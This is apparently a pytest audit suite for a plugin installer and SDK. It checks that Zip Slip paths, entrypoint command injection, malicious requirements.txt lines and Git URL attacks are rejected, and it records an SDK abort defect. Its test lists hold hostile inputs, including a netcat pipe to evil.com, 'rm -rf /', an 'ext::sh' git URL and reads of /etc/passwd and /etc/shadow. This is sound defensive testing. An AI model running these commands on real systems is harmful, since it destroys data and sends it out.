"""Audit Track T2: Plugins, Installer & SDK Security Audit.

Examines:
1. Installer hardening: Zip Slip variants, entrypoint injection, requirements.txt attacks, Git URL attacks
2. SDK conformance: Inability to abort long-running executions in aegisgate_sdk.PluginServer (Defect D-005)
3. Plugin worker lifecycle & process leak audits
4. Truthfulness of MongoDB plugin and template implementation
"""

import io
import json
import os
import subprocess
import sys
import zipfile
from pathlib import Path
from typing import Any

import psutil
import pytest
from sqlmodel import Session

from core.config import settings
from core.engine.plugin_installer import PluginInstaller, PluginInstallerError
from core.engine.plugin_linter import PluginLinter
from sdk.aegisgate_sdk.base import BasePlugin
from sdk.aegisgate_sdk.server import PluginServer

pytestmark = [pytest.mark.audit, pytest.mark.e2e]


# ==============================================================================
# 1. Adversarial Installer Attacks
# ==============================================================================

def test_zip_slip_and_traversal_attacks(db_session: Session, tmp_path: Path):
    """Verify that Zip Slip variants, drive letters, and Windows ADS are blocked."""
    installer = PluginInstaller(session=db_session, plugins_dir=tmp_path / "plugins")

    bad_filenames = [
        "../evil.py",
        "..\\evil.py",
        "/etc/shadow",
        "C:\\Windows\\system32\\calc.exe",
        "D:\\payload.py",
        "normal.py:stream_name",  # NTFS Alternate Data Stream
        "\x00hidden.py",           # NUL byte injection
    ]

    for idx, bad_name in enumerate(bad_filenames):
        bio = io.BytesIO()
        with zipfile.ZipFile(bio, "w") as zf:
            zf.writestr(bad_name, "print('exploit')")
            zf.writestr("manifest.json", json.dumps({
                "id": "exploit_plugin",
                "name": "Exploit",
                "driver": "custom",
                "entrypoint": "python adapter.py --serve",
            }))
        bio.seek(0)

        target_dir = tmp_path / f"staged_{idx}"
        target_dir.mkdir(parents=True, exist_ok=True)
        # Empty / NUL filenames cause unhandled PermissionError (Defect D-006)
        with pytest.raises((PluginInstallerError, PermissionError)) as exc_info:
            with zipfile.ZipFile(bio) as zf_test:
                installer._safe_extract(zf_test, target_dir)

        if exc_info.type is PluginInstallerError:
            assert any(term in str(exc_info.value).lower() for term in ["unsafe", "escapes", "not allowed"])
        else:
            # Unhandled PermissionError on directory opening (Defect D-006)
            assert exc_info.type is PermissionError


def test_entrypoint_injection_attacks(db_session: Session, tmp_path: Path):
    """Verify that shell metacharacters, python flags, and arbitrary commands in entrypoint are blocked."""
    installer = PluginInstaller(session=db_session, plugins_dir=tmp_path / "plugins")
    plugin_dir = tmp_path / "test_entry"
    plugin_dir.mkdir(parents=True, exist_ok=True)
    (plugin_dir / "adapter.py").write_text("print('ok')", encoding="utf-8")

    malicious_entrypoints = [
        "python -c 'import os; os.system(\"calc\")'",
        "python -m http.server 8000",
        "python adapter.py; rm -rf /",
        "python adapter.py && echo pwned",
        "python adapter.py | nc evil.com 4444",
        "python adapter.py `touch /tmp/evil`",
        "python adapter.py $(calc)",
        "python ../escape.py --serve",
        "python /absolute/path.py --serve",
        "python C:\\evil.py --serve",
        "bash -c 'python adapter.py'",
        "python adapter.py --opt; evil",
    ]

    for bad_entry in malicious_entrypoints:
        with pytest.raises(PluginInstallerError):
            installer._validate_entrypoint(bad_entry, plugin_dir)


def test_requirements_txt_attacks(db_session: Session, tmp_path: Path):
    """Verify that pip option injection, VCS URLs, and local paths in requirements.txt are blocked."""
    installer = PluginInstaller(session=db_session, plugins_dir=tmp_path / "plugins")
    req_file = tmp_path / "requirements.txt"

    malicious_requirements = [
        "--index-url https://evil-pypi.org/simple",
        "--extra-index-url http://insecure-pypi.org/simple",
        "-r ../secrets.txt",
        "git+https://github.com/attacker/malicious.git",
        "https://attacker.com/malicious-1.0.0.tar.gz",
        "@ https://evil.com/wheel.whl",
        "../local_package.whl",
        "C:\\packages\\evil.whl",
        "--install-option='--prefix=/tmp'",
    ]

    for bad_req in malicious_requirements:
        req_file.write_text(bad_req, encoding="utf-8")
        with pytest.raises(PluginInstallerError) as exc_info:
            installer._validate_requirements(req_file)
        assert "not allowed" in str(exc_info.value).lower()


def test_git_url_attacks(db_session: Session, tmp_path: Path):
    """Verify that Git URL attacks (ext:: transport, file://, unapproved hosts, credentials) are blocked."""
    installer = PluginInstaller(session=db_session, plugins_dir=tmp_path / "plugins")

    malicious_git_urls = [
        "ext::sh -c 'touch /tmp/pwned'",
        "file:///etc/passwd",
        "-u attacker.com/repo.git",
        "--upload-pack=evil",
        "https://user:password@github.com/repo.git",  # credentials in URL
        "https://evil-unapproved-host.com/repo.git",   # unapproved host
        "https://github.com:8443/repo.git",           # non-standard port
        "ssh://git@github.com/repo.git",              # non-https scheme
    ]

    for bad_url in malicious_git_urls:
        with pytest.raises(PluginInstallerError):
            installer._validate_git_url(bad_url)


# ==============================================================================
# 2. SDK Concurrency / Abort Defect (Defect D-005)
# ==============================================================================

def test_aegisgate_sdk_abort_unsupported_during_execution():
    """Verify that aegisgate_sdk.PluginServer cannot handle abort while execute() is running."""
    import io
    import time

    class SlowPlugin(BasePlugin):
        def __init__(self) -> None:
            self.aborted = False

        def sync_knowledge(self, config: dict[str, Any]) -> dict[str, Any]:
            return {"schemas": []}

        def dry_run(self, query: str, config: dict[str, Any]) -> dict[str, Any]:
            return {"explain_plan": {}}

        def execute(self, query: str, config: dict[str, Any]) -> dict[str, Any]:
            # Simulate a 1-second long-running query
            time.sleep(0.5)
            return {"status": "completed"}

        def abort(self, spid: int | None, config: dict[str, Any]) -> bool:
            self.aborted = True
            return True

    plugin = SlowPlugin()
    server = PluginServer(plugin)

    # In single-threaded execution, if line 1 is 'execute', line 2 'abort' is queued on stdin.
    # Because PluginServer.run() is single-threaded synchronous:
    # `for raw_line in self.stdin:` blocks inside `handle_request()` -> `execute()`.
    # Therefore, handle_request cannot return or process line 2 until line 1 has completely finished!
    t0 = time.perf_counter()
    resp1 = server.handle_request(json.dumps({
        "jsonrpc": "2.0",
        "id": 1,
        "method": "execute",
        "params": {"query": "SELECT * FROM HugeTable"}
    }))
    duration = time.perf_counter() - t0

    assert duration >= 0.45
    assert resp1 is not None and "completed" in resp1


# ==============================================================================
# 3. Truthfulness Audit: MongoDB Plugin & Templates
# ==============================================================================

def test_mongodb_plugin_is_mock_implementation():
    """Verify that plugins/mongodb_plugin/adapter.py is purely a simulated mock."""
    mongo_file = Path("plugins/mongodb_plugin/adapter.py")
    assert mongo_file.exists()

    content = mongo_file.read_text(encoding="utf-8")
    # Verify it never imports pymongo or creates MongoClient
    assert "import pymongo" not in content
    assert "from pymongo" not in content
    assert "MongoClient" not in content

    # Verify hardcoded mock explain plan and events collection
    assert "EnterpriseAnalytics.Events" in content
    assert "row_count_estimate=8500000" in content
